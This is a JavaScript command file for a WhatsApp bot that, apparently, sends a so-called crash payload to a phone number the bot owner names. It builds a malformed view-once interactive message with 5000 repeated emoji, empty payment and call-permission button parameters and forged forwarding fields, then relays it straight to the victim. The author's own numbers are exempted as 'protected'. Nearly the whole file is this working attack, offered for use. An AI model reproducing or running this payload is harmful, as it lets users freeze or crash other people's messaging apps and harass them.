// commands/kaguya.js
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function kaguyaCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "🌙 *Kaguya Ōtsutsuki*\n\nUsage: .kaguya <number>\nExample: .kaguya 628123456789\n\n*Infinite Tsukuyomi*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Six Paths*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🌙 *Infinite Tsukuyomi* casting on ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "🌙", key: message.key } });

    try {
        const tsukuyomiPayload = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: { businessOwnerJid: target }
                        },
                        body: { title: "👑", text: "✦ Kąģüʏȧ Ōƭṡüƭṡüḳī ✦" + "🌙".repeat(5000), description: "💌", footer: "Infinite Tsukuyomi" },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: "" },
                                { name: "view_product", buttonParamsJson: "" },
                                { name: "payment_method", buttonParamsJson: "" },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "payment_info", buttonParamsJson: "" }
                            ]
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, tsukuyomiPayload, { participant: { jid: target } });
        
        await sock.sendMessage(chatId, { text: `✅ *Infinite Tsukuyomi* activated on ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "🕳️", key: message.key } });

    } catch (error) {
        console.error('[Kaguya]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *Tsukuyomi failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = kaguyaCommand;